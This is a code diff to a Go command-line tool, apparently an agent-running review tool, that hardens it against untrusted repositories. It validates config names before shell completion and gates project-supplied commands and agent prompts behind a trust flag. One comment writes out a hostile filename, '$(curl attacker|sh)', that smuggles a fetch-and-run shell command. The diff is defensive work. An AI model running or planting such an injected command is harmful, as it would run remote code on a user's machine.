@@ -12,6 +12,7 @@ import (
 	"os"
 	"os/signal"
 	"path/filepath"
+	"regexp"
 	"sort"
 	"strings"
 	"sync"
@@ -120,7 +121,7 @@ Flags:
 	}
 	cfg := loaded.Config
 	logSource(logf, loaded)
-	if !allowProjectSuppliedExec(loaded, logf) {
+	if !allowProjectSuppliedPolicy(loaded, logf) {
 		return 1
 	}
 
@@ -275,6 +276,14 @@ func listPorcelain(r *config.Resolver, stdout, stderr io.Writer) int {
 		return 1
 	}
 	for _, c := range configs {
+		if !bundleNameRE.MatchString(c.Name) {
+			// Dropped, not mangled: a name that cannot be passed through safely is not
+			// one a caller could run either. Reported on stderr (quoted, so a control
+			// character cannot rewrite the operator's terminal) so a config vanishing
+			// from completion is explained rather than mysterious.
+			fmt.Fprintf(stderr, "skipping %q: a config name must be a bare identifier (letters, digits, dot, dash, underscore)\n", c.Path)
+			continue
+		}
 		state := "base"
 		if c.Runnable {
 			state = "runnable"
@@ -286,23 +295,34 @@ func listPorcelain(r *config.Resolver, stdout, stderr io.Writer) int {
 	return 0
 }
 
+// bundleNameRE is the documented shape of a bundle name: a bare identifier.
+//
+// Enforced on OUTPUT because a name is a FILENAME from a bundle directory, and the
+// first directory searched is <project>/config -- inside the repository under
+// review. That makes every name untrusted input that reaches a shell: completion
+// scripts consume this listing, and an installed script is generated once and never
+// regenerated, so the binary must not hand it a name it cannot quote. A repository
+// shipping config/'$(curl attacker|sh)'.yaml gets nothing past this point.
+var bundleNameRE = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)
+
 // sanitizeField flattens a value so it cannot break the tab-separated format.
 func sanitizeField(s string) string {
 	return strings.Join(strings.Fields(strings.ReplaceAll(s, "\t", " ")), " ")
 }
 
-// allowProjectSuppliedExec gates bundle files that were resolved from inside the
-// review target and that fixpoint executes -- agent commands and verify commands.
-// Those are executable policy, not data: a repository shipping its own
-// agents/*.yaml is supplying argv that fixpoint runs, which needs no model and no
-// prompt injection to exploit. It therefore requires the same explicit trust
-// assertion as letting the coder edit that repository.
-func allowProjectSuppliedExec(l *config.Loaded, logf func(string, ...any)) bool {
-	supplied := l.ProjectSuppliedExec()
+// allowProjectSuppliedPolicy gates bundle files that were resolved from inside the
+// project under review. Those are policy, not data: an agent command (from its own
+// file or inline in the task config) and a verify command are argv fixpoint runs,
+// and a prompt is the instruction stream it hands an agent that can read anything
+// the invoking user can. None of that needs a model's cooperation or a prompt
+// injection to exploit, so it requires the same explicit trust assertion as letting
+// the coder edit that repository.
+func allowProjectSuppliedPolicy(l *config.Loaded, logf func(string, ...any)) bool {
+	supplied := l.ProjectSuppliedPolicy()
 	if len(supplied) == 0 || l.Config.Loop.TrustedTarget {
 		return true
 	}
-	logf("refusing to run: the target supplies its own executable configuration, which fixpoint would execute:")
+	logf("refusing to run: the run is built from files inside the target, which supply the commands fixpoint executes and the instructions it sends to agents:")
 	for _, s := range supplied {
 		logf("  %s", s)
 	}
